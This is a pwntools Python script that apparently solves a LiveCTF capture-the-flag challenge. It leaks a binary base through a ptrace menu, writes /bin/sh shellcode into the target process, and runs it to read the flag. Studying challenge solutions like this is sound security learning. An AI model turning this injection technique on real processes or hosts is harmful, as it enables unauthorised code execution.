from pwn import *
import sys


HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

p = remote(HOST, int(PORT))


p.sendlineafter('?\n', '3')
p.sendlineafter('?\n', '8')
p.sendlineafter('?\n', '0')

p.recvuntil('ptrace returned ')
d = int(p.recvline()[:-1], 16)
p.sendlineafter('?', '1')

binbase = d - 0x3d68

target = binbase + 0x13B8

context(arch='amd64', os='linux')
shellcode = asm(shellcraft.amd64.linux.sh())
shellcode += b'\x90' * (len(shellcode) % 8)

for i in range(0, len(shellcode), 8):
  p.sendlineafter('?\n', '4')
  p.sendlineafter('?\n', hex(target + i))
  p.sendlineafter('?\n', hex(u64(shellcode[i:i+8])))
  p.recvuntil('ptrace returned ')
  d = int(p.recvline()[:-1], 16)
  p.sendlineafter('?', '1')

p.sendlineafter('?\n', '7')

p.sendlineafter('?\n', '0')
p.sendlineafter('?\n', '0')
p.sendlineafter('?', '0')

p.sendline(b'./submitter')
flag = p.recvline_contains(b'LiveCTF{').decode().strip()

log.info('Flag: %s', flag)